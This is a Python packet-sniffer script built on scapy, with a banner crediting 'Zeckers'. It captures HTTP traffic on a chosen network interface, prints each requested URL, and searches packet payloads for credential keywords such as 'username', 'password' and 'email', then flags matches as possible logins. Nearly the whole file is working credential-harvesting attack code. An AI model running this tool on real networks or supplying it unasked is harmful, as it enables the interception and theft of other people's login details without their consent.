#! usr/bin/env python

import scapy.all as scapy
import optparse
from scapy.layers import http
from termcolor import colored
from colorama import init
import pyfiglet


ascii_banner = pyfiglet.figlet_format("Packet Sniffer\n By Zeckers")
print(ascii_banner)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Enter an Interface ")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an Interface, use --help for more info")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_infos(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords_list = ["username", "user", "login", "password", "pass", "email", "mail"]
        for keyword in keywords_list:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(colored("[+] HTTP Request >> " + url, "yellow"))

        login_infos = get_login_infos(packet)
        if login_infos:
            print(colored("\n\n[+] Possible Username/Password >> " + login_infos + "\n\n", "red", "on_cyan"))


options = get_arguments()
inter = options.interface
sniff(inter)
